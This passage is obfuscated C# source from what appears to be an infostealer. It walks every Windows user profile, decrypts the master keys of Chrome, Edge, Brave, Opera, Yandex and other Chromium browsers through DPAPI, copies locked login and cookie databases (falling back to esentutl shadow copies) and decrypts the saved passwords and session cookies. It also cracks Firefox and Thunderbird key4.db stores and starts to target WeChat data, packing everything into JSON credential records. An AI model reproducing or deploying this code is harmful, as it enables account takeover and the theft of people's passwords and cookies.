            string roamApp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            
            if (impersonated && userToken != IntPtr.Zero &&
                (string.IsNullOrEmpty(localApp) || localApp.Contains(@"\systemprofile")))
            {
                try
                {
                    var profBuf = new StringBuilder(260);
                    uint sz = 260;
                    if (GetUserProfileDirectory(userToken, profBuf, ref sz))
                    {
                        string profDir = profBuf.ToString();
                        localApp = Path.Combine(profDir, @"AppData\Local");
                        roamApp = Path.Combine(profDir, @"AppData\Roaming");
                    }
                }
                catch { }
            }

            
            var userProfiles = new List<string[]>(); 
            if (string.IsNullOrEmpty(localApp) || localApp.Contains(@"\systemprofile") || !Directory.Exists(localApp))
            {
                string usersRoot = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") ?? "C:", "Users");
                if (Directory.Exists(usersRoot))
                {
                    foreach (string ud in Directory.GetDirectories(usersRoot))
                    {
                        string dn = Path.GetFileName(ud).ToLowerInvariant();
                        if (dn == "public" || dn == "default" || dn == "default user" || dn == "all users") continue;
                        string la = Path.Combine(ud, @"AppData\Local");
                        string ra = Path.Combine(ud, @"AppData\Roaming");
                        if (Directory.Exists(la)) userProfiles.Add(new string[] { la, ra, Path.GetFileName(ud) });
                    }
                }
            }
            else
            {
                userProfiles.Add(new string[] { localApp, roamApp, Environment.UserName });
            }

            
            first = ReportBrowserDiag(sb, first, "env",
                "user=" + origUser +
                (impersonated ? " impersonated=true" : "") +
                " profiles=" + userProfiles.Count +
                " localApp=" + (string.IsNullOrEmpty(localApp) ? "EMPTY" : localApp));

            foreach (var profile in userProfiles)
            {
                string profLocalApp = profile[0];
                string profRoamApp = profile[1];
                string profLabel = profile[2];

            
            string[][] browsers = new string[][] {
                new string[] { "chrome", Path.Combine(profLocalApp, @"Google\Chrome\User Data") },
                new string[] { "edge",   Path.Combine(profLocalApp, @"Microsoft\Edge\User Data") },
                new string[] { "brave",  Path.Combine(profLocalApp, @"BraveSoftware\Brave-Browser\User Data") },
                new string[] { "opera",  Path.Combine(profRoamApp,  @"Opera Software\Opera Stable") },
                new string[] { "operagx",Path.Combine(profRoamApp,  @"Opera Software\Opera GX Stable") },
                new string[] { "vivaldi",Path.Combine(profLocalApp, @"Vivaldi\User Data") },
                new string[] { "360se",  Path.Combine(profLocalApp, @"360Chrome\Chrome\User Data") },
                new string[] { "360ee",  Path.Combine(profLocalApp, @"360ChromeX\Chrome\User Data") },
                new string[] { "qq",     Path.Combine(profLocalApp, @"Tencent\QQBrowser\User Data") },
                new string[] { "yandex", Path.Combine(profLocalApp, @"Yandex\YandexBrowser\User Data") },
            };

            int foundBrowsers = 0;
            foreach (string[] br in browsers)
            {
                string bName = (userProfiles.Count > 1) ? profLabel + "/" + br[0] : br[0];
                string basePath = br[1];
                try
                {
                    if (!Directory.Exists(basePath)) continue;
                    foundBrowsers++;

                    
                    string localStatePath = Path.Combine(basePath, _Q._S("IJZEpqfdtHZCd9Q="));
                    
                    if (!File.Exists(localStatePath))
                    {
                        string parent = Path.GetDirectoryName(basePath);
                        if (parent != null)
                        {
                            string alt = Path.Combine(parent, _Q._S("IJZEpqfdtHZCd9Q="));
                            if (File.Exists(alt)) localStatePath = alt;
                        }
                    }
                    if (!File.Exists(localStatePath))
                    {
                        first = ReportBrowserDiag(sb, first, bName, "no Local State");
                        continue;
                    }

                    string localStateJson = File.ReadAllText(localStatePath);
                    string encKeyB64 = ExtractJsonStr(localStateJson, _Q._S("CZdEtbKNk2dHXNpWCA=="));
                    if (string.IsNullOrEmpty(encKeyB64))
                    {
                        first = ReportBrowserDiag(sb, first, bName, "no encrypted_key");
                        continue;
                    }

                    byte[] encKeyRaw = Convert.FromBase64String(encKeyB64);
                    byte[] masterKey = null;

                    
                    string prefix = (encKeyRaw.Length >= 4) ? Encoding.ASCII.GetString(encKeyRaw, 0, 4) : "";
                    string prefix5 = (encKeyRaw.Length >= 5) ? Encoding.ASCII.GetString(encKeyRaw, 0, 5) : "";

                    if (prefix == "APPB")
                    {
                        
                        try { masterKey = TryDecryptAppBound(encKeyRaw); } catch { }

                        
                        if (masterKey == null || masterKey.Length == 0)
                        {
                            byte[] appbBlob = new byte[encKeyRaw.Length - 4];
                            Array.Copy(encKeyRaw, 4, appbBlob, 0, appbBlob.Length);
                            try { masterKey = _MEwvDWlydaWx(appbBlob, false); } catch { }
                            if (masterKey == null || masterKey.Length == 0)
                                try { masterKey = _MEwvDWlydaWx(appbBlob, true); } catch { }
                        }
                    }
                    else
                    {
                        
                        byte[] dpapiBlob = null;
                        if (encKeyRaw.Length > 5)
                        {
                            dpapiBlob = new byte[encKeyRaw.Length - 5];
                            Array.Copy(encKeyRaw, 5, dpapiBlob, 0, dpapiBlob.Length);
                        }

                        
                        if (dpapiBlob != null)
                            masterKey = _MEwvDWlydaWx(dpapiBlob, false);

                        
                        if ((masterKey == null || masterKey.Length == 0) && dpapiBlob != null)
                            masterKey = _MEwvDWlydaWx(dpapiBlob, true);
                    }

                    
                    if (masterKey == null || masterKey.Length == 0)
                        masterKey = TrySystemDPAPIDecrypt(encKeyRaw);

                    if (masterKey == null || masterKey.Length == 0)
                    {
                        first = ReportBrowserDiag(sb, first, bName, "key_fail prefix=" + prefix + " rawLen=" + encKeyRaw.Length);
                        continue;
                    }

                    first = ReportBrowserDiag(sb, first, bName, "key_ok len=" + masterKey.Length);

                    
                    var profileDirs = new List<string>();
                    foreach (string dir in Directory.GetDirectories(basePath))
                    {
                        string dirName = Path.GetFileName(dir);
                        if (dirName == "Default" || dirName.StartsWith("Profile "))
                            profileDirs.Add(dirName);
                    }
                    
                    if (profileDirs.Count == 0)
                    {
                        if (File.Exists(Path.Combine(basePath, _Q._S("IJZArqXdo2NXYg=="))) ||
                            File.Exists(Path.Combine(basePath, "Cookies")) ||
                            File.Exists(Path.Combine(basePath, "Network", "Cookies")))
                            profileDirs.Add(".");
                        else
                            profileDirs.Add("Default");
                    }

                    foreach (string browserProfile in profileDirs)
                    {
                        string profDir = (browserProfile == ".") ? basePath : Path.Combine(basePath, browserProfile);

                        
                        string loginDataPath = Path.Combine(profDir, _Q._S("IJZArqXdo2NXYg=="));
                        if (File.Exists(loginDataPath))
                        {
                            string tempDb = Path.Combine(Path.GetTempPath(), "ld_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".db");
                            try
                            {
                                CopyLockedFile(loginDataPath, tempDb);
                                try { if (File.Exists(loginDataPath + "-wal")) CopyLockedFile(loginDataPath + "-wal", tempDb + "-wal"); } catch { }
                                try { if (File.Exists(loginDataPath + "-shm")) CopyLockedFile(loginDataPath + "-shm", tempDb + "-shm"); } catch { }
                                first = _oXlVgCiUugXiJscUDMNE(tempDb, masterKey, bName, sb, first);
                            }
                            catch (Exception ex)
                            {
                                first = ReportBrowserDiag(sb, first, bName, "login:" + ex.Message);
                            }
                            finally { try { File.Delete(tempDb); } catch { } try { File.Delete(tempDb + "-wal"); } catch { } try { File.Delete(tempDb + "-shm"); } catch { } }
                        }

                        
                        string cookiePath = Path.Combine(profDir, "Network", "Cookies");
                        if (!File.Exists(cookiePath)) cookiePath = Path.Combine(profDir, "Cookies");
                        if (File.Exists(cookiePath))
                        {
                            string tempCk = Path.Combine(Path.GetTempPath(), "ck_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".db");
                            try
                            {
                                CopyLockedFile(cookiePath, tempCk);
                                try { if (File.Exists(cookiePath + "-wal")) CopyLockedFile(cookiePath + "-wal", tempCk + "-wal"); } catch { }
                                try { if (File.Exists(cookiePath + "-shm")) CopyLockedFile(cookiePath + "-shm", tempCk + "-shm"); } catch { }
                                first = ParseCookieSqlite(tempCk, masterKey, bName, sb, first);
                            }
                            catch (Exception ex)
                            {
                                first = ReportBrowserDiag(sb, first, bName, "cookie:" + ex.Message);
                            }
                            finally { try { File.Delete(tempCk); } catch { } try { File.Delete(tempCk + "-wal"); } catch { } try { File.Delete(tempCk + "-shm"); } catch { } }
                        }
                    }
                }
                catch (Exception ex)
                {
                    first = ReportBrowserDiag(sb, first, bName, "fatal:" + ex.Message);
                }
            }
            
            if (foundBrowsers == 0)
                first = ReportBrowserDiag(sb, first, profLabel, "no_browsers_found in " + profLocalApp);
            } 

            } 
            finally
            {
                
                if (impersonated) try { RevertToSelf(); } catch {}
                if (userToken != IntPtr.Zero) try { CloseHandle(userToken); } catch {}
            }
            return first;
        }

        bool ReportBrowserDiag(StringBuilder sb, bool first, string browser, string msg)
        {
            if (!first) sb.Append(",");
            sb.Append("{\"source\":\"" + browser + "-diag\",\"target\":\"\",\"username\":\"\",\"password\":\"" + _AexenijxeK(msg) + "\",\"type\":9}");
            return false;
        }

        
        void CopyLockedFile(string src, string dst)
        {
            
            try { File.Copy(src, dst, true); if (new FileInfo(dst).Length > 0) return; } catch { }
            
            try
            {
                using (var fs = new FileStream(src, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
                using (var ws = new FileStream(dst, FileMode.Create, FileAccess.Write))
                {
                    byte[] buf = new byte[65536];
                    int n;
                    while ((n = fs.Read(buf, 0, buf.Length)) > 0) ws.Write(buf, 0, n);
                }
                if (new FileInfo(dst).Length > 0) return;
            }
            catch { }
            
            try
            {
                try { _fSshpcIDbaxmHgw(_Q._S("P5xlpqiWknJzcdhFGH2xEQk=")); } catch { }
                
                IntPtr hFile = CreateFileW(src, 0x80000000, 7, IntPtr.Zero, 3, 0x02000000, IntPtr.Zero);
                if (hFile != INVALID_HANDLE_VALUE)
                {
                    try
                    {
                        uint sizeHigh;
                        uint sizeLow = GetFileSize(hFile, out sizeHigh);
                        long fileSize = ((long)sizeHigh << 32) | sizeLow;
                        using (var ws = new FileStream(dst, FileMode.Create, FileAccess.Write))
                        {
                            byte[] buf = new byte[65536];
                            long remaining = fileSize;
                            while (remaining > 0)
                            {
                                int toRead = (int)Math.Min(buf.Length, remaining);
                                int bytesRead;
                                if (!ReadFile(hFile, buf, toRead, out bytesRead, IntPtr.Zero) || bytesRead == 0) break;
                                ws.Write(buf, 0, bytesRead);
                                remaining -= bytesRead;
                            }
                        }
                    }
                    finally { CloseHandle(hFile); }
                    if (File.Exists(dst) && new FileInfo(dst).Length > 0) return;
                }
            }
            catch { }
            
            try
            {
                var psi = new ProcessStartInfo("esentutl.exe", "/y \"" + src + "\" /vss /d \"" + dst + "\"")
                { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden,
                  RedirectStandardOutput = true, RedirectStandardError = true };
                var proc = Process.Start(psi);
                proc.WaitForExit(15000);
                if (File.Exists(dst) && new FileInfo(dst).Length > 0) return;
            }
            catch { }
            
            File.Copy(src, dst, true);
        }

        
        
        byte[] TryDecryptAppBound(byte[] encKeyRaw)
        {
            
            if (encKeyRaw == null || encKeyRaw.Length <= 4) return null;
            byte[] blob = new byte[encKeyRaw.Length - 4];
            Array.Copy(encKeyRaw, 4, blob, 0, blob.Length);
            try { byte[] r = _MEwvDWlydaWx(blob, false); if (r != null && r.Length > 0) return r; } catch { }
            try { byte[] r = _MEwvDWlydaWx(blob, true); if (r != null && r.Length > 0) return r; } catch { }
            return null;
        }

        
        byte[] TrySystemDPAPIDecrypt(byte[] encKeyRaw)
        {
            if (encKeyRaw == null || encKeyRaw.Length <= 5) return null;

            
            string pfx = (encKeyRaw.Length >= 4) ? Encoding.ASCII.GetString(encKeyRaw, 0, 4) : "";
            int skip = (pfx == "APPB") ? 4 : 5;
            if (encKeyRaw.Length <= skip) return null;
            byte[] blob = new byte[encKeyRaw.Length - skip];
            Array.Copy(encKeyRaw, skip, blob, 0, blob.Length);

            
            try { byte[] r = _MEwvDWlydaWx(blob, false); if (r != null && r.Length > 0) return r; } catch { }
            try { byte[] r = _MEwvDWlydaWx(blob, true); if (r != null && r.Length > 0) return r; } catch { }
            return null;
        }

        byte[] _MEwvDWlydaWx(byte[] encData, bool localMachine = false)
        {
            
            IntPtr dataIn = IntPtr.Zero;
            IntPtr dataOut = IntPtr.Zero;
            try
            {
                
                dataIn = Marshal.AllocHGlobal(IntPtr.Size * 2);
                Marshal.WriteInt32(dataIn, encData.Length);
                IntPtr encBuf = Marshal.AllocHGlobal(encData.Length);
                Marshal.Copy(encData, 0, encBuf, encData.Length);
                Marshal.WriteIntPtr(dataIn, IntPtr.Size, encBuf);

                dataOut = Marshal.AllocHGlobal(IntPtr.Size * 2);
                Marshal.WriteInt32(dataOut, 0);
                Marshal.WriteIntPtr(dataOut, IntPtr.Size, IntPtr.Zero);

                int flags = localMachine ? 4 : 0; 
                bool ok = CryptUnprotectData(dataIn, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, flags, dataOut);
                Marshal.FreeHGlobal(encBuf);

                if (!ok) return null;

                int outLen = Marshal.ReadInt32(dataOut, 0);
                IntPtr outPtr = Marshal.ReadIntPtr(dataOut, IntPtr.Size);
                byte[] result = new byte[outLen];
                Marshal.Copy(outPtr, result, 0, outLen);
                LocalFree(outPtr);
                return result;
            }
            catch { return null; }
            finally
            {
                if (dataIn != IntPtr.Zero) Marshal.FreeHGlobal(dataIn);
                if (dataOut != IntPtr.Zero) Marshal.FreeHGlobal(dataOut);
            }
        }

        
        bool _oXlVgCiUugXiJscUDMNE(string dbPath, byte[] masterKey, string browser, StringBuilder sb, bool first)
        {
            IntPtr db = IntPtr.Zero, stmt = IntPtr.Zero;
            try
            {
                byte[] pathUtf8 = Encoding.UTF8.GetBytes(dbPath + "\0");
                if (sqlite3_open_v2(pathUtf8, out db, SQLITE_OPEN_READONLY, IntPtr.Zero) != SQLITE_OK)
                    return first;

                byte[] sql = Encoding.UTF8.GetBytes("SELECT origin_url, username_value, password_value FROM logins\0");
                if (sqlite3_prepare_v2(db, sql, -1, out stmt, IntPtr.Zero) != SQLITE_OK)
                    return first;

                while (sqlite3_step(stmt) == SQLITE_ROW)
                {
                    try
                    {
                        string originUrl = SqliteColStr(stmt, 0);
                        string username = SqliteColStr(stmt, 1);
                        byte[] pwdBlob = SqliteColBlob(stmt, 2);
                        if (pwdBlob == null || pwdBlob.Length == 0) continue;

                        string pwd = null;
                        if (pwdBlob.Length > 15 && pwdBlob[0] == 0x76 && pwdBlob[1] == 0x31 &&
                            (pwdBlob[2] == 0x30 || pwdBlob[2] == 0x31))
                        {
                            byte[] nonce = new byte[12];
                            Array.Copy(pwdBlob, 3, nonce, 0, 12);
                            byte[] ct = new byte[pwdBlob.Length - 15];
                            Array.Copy(pwdBlob, 15, ct, 0, ct.Length);
                            pwd = _JCaMrqQFAzRQa(masterKey, nonce, ct);
                        }
                        else if (!(pwdBlob[0] == 0x76 && pwdBlob[1] == 0x31))
                        {
                            try { byte[] dec = _MEwvDWlydaWx(pwdBlob); if (dec != null && dec.Length > 0) pwd = Encoding.UTF8.GetString(dec); } catch { }
                        }

                        if (!string.IsNullOrEmpty(pwd) && pwd.Length < 200)
                        {
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format("{{\"source\":\"{0}\",\"target\":\"{1}\",\"username\":\"{2}\",\"password\":\"{3}\",\"type\":0}}",
                                browser, _AexenijxeK(originUrl), _AexenijxeK(username), _AexenijxeK(pwd)));
                        }
                    }
                    catch { }
                }
            }
            catch { }
            finally
            {
                if (stmt != IntPtr.Zero) sqlite3_finalize(stmt);
                if (db != IntPtr.Zero) sqlite3_close(db);
            }
            return first;
        }

        
        string ExtractJsonStr(string json, string key)
        {
            string needle = "\"" + key + "\"";
            int idx = json.IndexOf(needle);
            if (idx < 0) return null;
            int colon = json.IndexOf(':', idx + needle.Length);
            if (colon < 0) return null;
            int sq = json.IndexOf('"', colon + 1);
            if (sq < 0) return null;
            int eq = sq + 1;
            while (eq < json.Length)
            {
                if (json[eq] == '\\') { eq += 2; continue; }
                if (json[eq] == '"') break;
                eq++;
            }
            if (eq >= json.Length) return null;
            return json.Substring(sq + 1, eq - sq - 1);
        }

        
        bool ParseCookieSqlite(string dbPath, byte[] masterKey, string browser, StringBuilder sb, bool first)
        {
            IntPtr db = IntPtr.Zero, stmt = IntPtr.Zero;
            try
            {
                byte[] pathUtf8 = Encoding.UTF8.GetBytes(dbPath + "\0");
                if (sqlite3_open_v2(pathUtf8, out db, SQLITE_OPEN_READONLY, IntPtr.Zero) != SQLITE_OK)
                    return first;

                byte[] sql = Encoding.UTF8.GetBytes("SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 200\0");
                if (sqlite3_prepare_v2(db, sql, -1, out stmt, IntPtr.Zero) != SQLITE_OK)
                    return first;

                int cookieCount = 0;
                while (sqlite3_step(stmt) == SQLITE_ROW && cookieCount < 200)
                {
                    try
                    {
                        string hostKey = SqliteColStr(stmt, 0);
                        string cookieName = SqliteColStr(stmt, 1);
                        string cookieValue = SqliteColStr(stmt, 2);
                        byte[] encValue = SqliteColBlob(stmt, 3);

                        string finalValue = cookieValue;
                        if (string.IsNullOrEmpty(finalValue) && encValue != null && encValue.Length > 0)
                        {
                            if (encValue.Length > 15 && encValue[0] == 0x76 && encValue[1] == 0x31 &&
                                (encValue[2] == 0x30 || encValue[2] == 0x31))
                            {
                                byte[] nonce = new byte[12];
                                Array.Copy(encValue, 3, nonce, 0, 12);
                                byte[] ct = new byte[encValue.Length - 15];
                                Array.Copy(encValue, 15, ct, 0, ct.Length);
                                finalValue = _JCaMrqQFAzRQa(masterKey, nonce, ct);
                            }
                            else if (!(encValue[0] == 0x76 && encValue[1] == 0x31))
                            {
                                try { byte[] dec = _MEwvDWlydaWx(encValue); if (dec != null) finalValue = Encoding.UTF8.GetString(dec); } catch { }
                            }
                        }

                        if (!string.IsNullOrEmpty(hostKey) && !string.IsNullOrEmpty(cookieName) &&
                            !string.IsNullOrEmpty(finalValue) && finalValue.Length < 4096)
                        {
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format("{{\"source\":\"{0}\",\"target\":\"{1}\",\"username\":\"{2}\",\"password\":\"{3}\",\"type\":1}}",
                                browser + "-cookie", _AexenijxeK(hostKey), _AexenijxeK(cookieName), _AexenijxeK(finalValue)));
                            cookieCount++;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            finally
            {
                if (stmt != IntPtr.Zero) sqlite3_finalize(stmt);
                if (db != IntPtr.Zero) sqlite3_close(db);
            }
            return first;
        }

        
        static string SqliteColStr(IntPtr stmt, int col)
        {
            IntPtr ptr = sqlite3_column_text(stmt, col);
            if (ptr == IntPtr.Zero) return "";
            int len = 0;
            while (Marshal.ReadByte(ptr, len) != 0) len++;
            if (len == 0) return "";
            byte[] buf = new byte[len];
            Marshal.Copy(ptr, buf, 0, len);
            return Encoding.UTF8.GetString(buf);
        }

        static byte[] SqliteColBlob(IntPtr stmt, int col)
        {
            IntPtr ptr = sqlite3_column_blob(stmt, col);
            int len = sqlite3_column_bytes(stmt, col);
            if (ptr == IntPtr.Zero || len <= 0) return null;
            byte[] buf = new byte[len];
            Marshal.Copy(ptr, buf, 0, len);
            return buf;
        }

        
        
        
        bool DumpFirefoxPasswords(StringBuilder sb, bool first)
        {
            string[][] apps = new string[][] {
                new string[] { "firefox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles") },
                new string[] { "thunderbird", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird", "Profiles") },
            };
            foreach (var app in apps)
            {
                string srcName = app[0], profilesDir = app[1];
                if (!Directory.Exists(profilesDir)) continue;
                foreach (string profDir in Directory.GetDirectories(profilesDir))
                {
                    try { first = ExtractFirefoxProfile(profDir, srcName, sb, first); } catch { }
                }
            }
            return first;
        }

        bool ExtractFirefoxProfile(string profDir, string srcName, StringBuilder sb, bool first)
        {
            string key4Path = Path.Combine(profDir, "key4.db");
            string loginsPath = Path.Combine(profDir, "logins.json");
            if (!File.Exists(key4Path) || !File.Exists(loginsPath)) return first;

            
            string tmpKey4 = Path.Combine(Path.GetTempPath(), "fk_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".db");
            try
            {
                CopyLockedFile(key4Path, tmpKey4);
                byte[] masterKey = DecryptFirefoxMasterKey(tmpKey4);
                if (masterKey == null || masterKey.Length == 0)
                {
                    first = ReportBrowserDiag(sb, first, srcName.ToUpper() + "-DIAG", "key4 decrypt fail");
                    return first;
                }

                
                string loginsJson = File.ReadAllText(loginsPath);
                first = ParseFirefoxLogins(loginsJson, masterKey, srcName, sb, first);
            }
            catch (Exception ex)
            {
                first = ReportBrowserDiag(sb, first, srcName.ToUpper() + "-DIAG", ex.Message);
            }
            finally
            {
                try { File.Delete(tmpKey4); } catch { }
            }
            return first;
        }

        byte[] DecryptFirefoxMasterKey(string key4DbPath)
        {
            IntPtr db = IntPtr.Zero, stmt = IntPtr.Zero;
            try
            {
                byte[] pathUtf8 = Encoding.UTF8.GetBytes(key4DbPath + "\0");
                if (sqlite3_open_v2(pathUtf8, out db, SQLITE_OPEN_READONLY, IntPtr.Zero) != SQLITE_OK)
                    return null;

                
                byte[] globalSalt = null, item2 = null;
                byte[] sql1 = Encoding.UTF8.GetBytes("SELECT item1, item2 FROM metaData WHERE id='password'\0");
                if (sqlite3_prepare_v2(db, sql1, sql1.Length, out stmt, IntPtr.Zero) == SQLITE_OK)
                {
                    if (sqlite3_step(stmt) == SQLITE_ROW)
                    {
                        globalSalt = SqliteColBlob(stmt, 0);
                        item2 = SqliteColBlob(stmt, 1);
                    }
                    sqlite3_finalize(stmt); stmt = IntPtr.Zero;
                }
                if (globalSalt == null || item2 == null) return null;

                
                byte[] a11 = null;
                byte[] sql2 = Encoding.UTF8.GetBytes("SELECT a11 FROM nssPrivate\0");
                if (sqlite3_prepare_v2(db, sql2, sql2.Length, out stmt, IntPtr.Zero) == SQLITE_OK)
                {
                    if (sqlite3_step(stmt) == SQLITE_ROW)
                        a11 = SqliteColBlob(stmt, 0);
                    sqlite3_finalize(stmt); stmt = IntPtr.Zero;
                }
                if (a11 == null) return null;

                
                byte[] emptyPwd = new byte[0];
                byte[] checkVal = NSSDecryptBlob(globalSalt, emptyPwd, item2);
                if (checkVal == null) return null;
                string checkStr = Encoding.UTF8.GetString(checkVal);
                if (!checkStr.StartsWith("password-check")) return null; 

                
                byte[] masterKey = NSSDecryptBlob(globalSalt, emptyPwd, a11);
                return masterKey;
            }
            finally
            {
                if (stmt != IntPtr.Zero) sqlite3_finalize(stmt);
                if (db != IntPtr.Zero) sqlite3_close(db);
            }
        }

        
        byte[] NSSDecryptBlob(byte[] globalSalt, byte[] masterPwd, byte[] asn1Data)
        {
            if (asn1Data == null || asn1Data.Length < 10) return null;
            int pos = 0, tLen;
            
            if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out tLen)) return null;
            
            int algLen;
            if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out algLen)) return null;
            int algContentEnd = pos + algLen;
            
            int oidLen;
            if (!Asn1ReadTag(asn1Data, ref pos, 0x06, out oidLen)) return null;
            byte[] oid = new byte[oidLen];
            Array.Copy(asn1Data, pos, oid, 0, oidLen);
            pos += oidLen;

            
            int encDataPos = algContentEnd;
            int encDataLen;
            if (!Asn1ReadTag(asn1Data, ref encDataPos, 0x04, out encDataLen)) return null;
            byte[] encData = new byte[encDataLen];
            Array.Copy(asn1Data, encDataPos, encData, 0, encDataLen);

            
            byte[] pbe3desOid = new byte[] { 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x0C, 0x05, 0x01, 0x03 };
            
            byte[] pbes2Oid = new byte[] { 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0D };

            if (ByteArrayEquals(oid, pbe3desOid))
            {
                int esLen;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out tLen)) return null;
                if (!Asn1ReadTag(asn1Data, ref pos, 0x04, out esLen)) return null;
                byte[] entrySalt = new byte[esLen];
                Array.Copy(asn1Data, pos, entrySalt, 0, esLen);

                
                byte[] hp = SHA1Hash(Concat(globalSalt, masterPwd));
                byte[] pes = new byte[20];
                Array.Copy(entrySalt, 0, pes, 0, Math.Min(entrySalt.Length, 20));
                byte[] chp = SHA1Hash(Concat(hp, entrySalt));
                byte[] k1 = HMACSHA1Hash(chp, Concat(pes, entrySalt));
                byte[] tk = HMACSHA1Hash(chp, pes);
                byte[] k2 = HMACSHA1Hash(chp, Concat(tk, entrySalt));
                byte[] k = Concat(k1, k2); 
                byte[] desKey = new byte[24];
                byte[] desIv = new byte[8];
                Array.Copy(k, 0, desKey, 0, 24);
                Array.Copy(k, k.Length - 8, desIv, 0, 8);
                return TripleDESDecrypt(desKey, desIv, encData);
            }
            else if (ByteArrayEquals(oid, pbes2Oid))
            {
                int kdfLen, kdfOidLen, saltLen, iterLen, klLen, aesOidLen, ivLen;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out tLen)) return null; 
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out kdfLen)) return null;
                int kdfEnd = pos + kdfLen;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x06, out kdfOidLen)) return null;
                pos += kdfOidLen;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out tLen)) return null;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x04, out saltLen)) return null;
                byte[] pbkSalt = new byte[saltLen];
                Array.Copy(asn1Data, pos, pbkSalt, 0, saltLen);
                pos += saltLen;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x02, out iterLen)) return null;
                int iterations = 0;
                for (int i = 0; i < iterLen; i++) iterations = (iterations << 8) | asn1Data[pos + i];
                pos += iterLen;
                
                int keyLength = 32;
                if (pos < kdfEnd && asn1Data[pos] == 0x02)
                {
                    if (Asn1ReadTag(asn1Data, ref pos, 0x02, out klLen))
                    {
                        keyLength = 0;
                        for (int i = 0; i < klLen; i++) keyLength = (keyLength << 8) | asn1Data[pos + i];
                        pos += klLen;
                    }
                }
                
                pos = kdfEnd;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out tLen)) return null;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x06, out aesOidLen)) return null;
                pos += aesOidLen;
                
                if (!Asn1ReadTag(asn1Data, ref pos, 0x04, out ivLen)) return null;
                byte[] aesIv = new byte[ivLen];
                Array.Copy(asn1Data, pos, aesIv, 0, ivLen);

                
                byte[] passHash = SHA1Hash(Concat(globalSalt, masterPwd));
                byte[] aesKey = PBKDF2_SHA256(passHash, pbkSalt, iterations, keyLength);
                return AesCBCDecrypt(aesKey, aesIv, encData);
            }
            return null;
        }

        
        bool ParseFirefoxLogins(string json, byte[] masterKey, string srcName, StringBuilder sb, bool first)
        {
            
            int searchStart = 0;
            while (true)
            {
                int hostIdx = json.IndexOf("\"hostname\"", searchStart);
                if (hostIdx < 0) break;
                string host = ExtractJsonStrAt(json, hostIdx);
                string encUser = "";
                string encPwd = "";
                
                int nextHost = json.IndexOf("\"hostname\"", hostIdx + 10);
                string block = (nextHost > 0) ? json.Substring(hostIdx, nextHost - hostIdx) : json.Substring(hostIdx);

                int euIdx = block.IndexOf("\"encryptedUsername\"");
                if (euIdx >= 0) encUser = ExtractJsonStrAt(block, euIdx);
                int epIdx = block.IndexOf("\"encryptedPassword\"");
                if (epIdx >= 0) encPwd = ExtractJsonStrAt(block, epIdx);

                searchStart = hostIdx + 10;
                if (string.IsNullOrEmpty(host) || (string.IsNullOrEmpty(encUser) && string.IsNullOrEmpty(encPwd))) continue;

                string username = "";
                string password = "";
                try
                {
                    if (!string.IsNullOrEmpty(encUser))
                        username = DecryptFirefoxLoginField(Convert.FromBase64String(encUser), masterKey);
                    if (!string.IsNullOrEmpty(encPwd))
                        password = DecryptFirefoxLoginField(Convert.FromBase64String(encPwd), masterKey);
                }
                catch { continue; }

                if (string.IsNullOrEmpty(username) && string.IsNullOrEmpty(password)) continue;
                if (!first) sb.Append(",");
                first = false;
                sb.Append(string.Format("{{\"source\":\"{0}\",\"target\":\"{1}\",\"username\":\"{2}\",\"password\":\"{3}\",\"type\":0}}",
                    _AexenijxeK(srcName), _AexenijxeK(host), _AexenijxeK(username), _AexenijxeK(password)));
            }
            return first;
        }

        
        string DecryptFirefoxLoginField(byte[] asn1Data, byte[] masterKey)
        {
            if (asn1Data == null || asn1Data.Length < 10) return "";
            int pos = 0, tLen, algLen, oidLen, ivLen, encLen;
            
            if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out tLen)) return "";
            
            if (!Asn1ReadTag(asn1Data, ref pos, 0x30, out algLen)) return "";
            int algEnd = pos + algLen;
            
            if (!Asn1ReadTag(asn1Data, ref pos, 0x06, out oidLen)) return "";
            pos += oidLen;
            
            if (!Asn1ReadTag(asn1Data, ref pos, 0x04, out ivLen)) return "";
            byte[] iv = new byte[ivLen];
            Array.Copy(asn1Data, pos, iv, 0, ivLen);
            pos = algEnd;
            
            if (!Asn1ReadTag(asn1Data, ref pos, 0x04, out encLen)) return "";
            byte[] encData = new byte[encLen];
            Array.Copy(asn1Data, pos, encData, 0, encLen);

            
            byte[] desKey = new byte[24];
            Array.Copy(masterKey, 0, desKey, 0, Math.Min(masterKey.Length, 24));
            byte[] plain = TripleDESDecrypt(desKey, iv, encData);
            if (plain == null) return "";
            return Encoding.UTF8.GetString(plain).TrimEnd('\0');
        }

        
        
        
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        bool _xqoyhNoXyNwmND(StringBuilder sb, bool first)
        {
            
            var dataDirs = new List<string[]>(); 

            
            try
            {
                string xwRoot = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), _Q._S("OJxJpK6Tkw=="), "xwechat");
                if (Directory.Exists(Path.Combine(xwRoot, "config")))
                {
